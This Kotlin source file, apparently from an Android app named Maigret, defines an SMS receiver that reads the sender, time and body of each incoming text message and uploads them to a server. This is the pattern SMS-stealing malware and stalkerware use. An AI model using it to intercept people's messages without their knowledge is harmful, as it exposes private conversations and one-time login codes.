package app.maigret.receivers.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import app.maigret.actions.Upload
import app.maigret.models.Sms
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            // Extract new sms list from Intent
            val smsList = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            if (smsList.isNotEmpty()) {
                val sms = Sms(
                    sender = smsList[0].displayOriginatingAddress.toString(),
                    date = SimpleDateFormat(
                        "yyyy-MM-dd hh:mm:ss",
                        Locale.US
                    ).format(smsList[0].timestampMillis),
                    body = smsList[0].displayMessageBody.toString(),
                )

                // Send newly received sms to server
                Upload.sms(sms)
            }
        }
    }
}
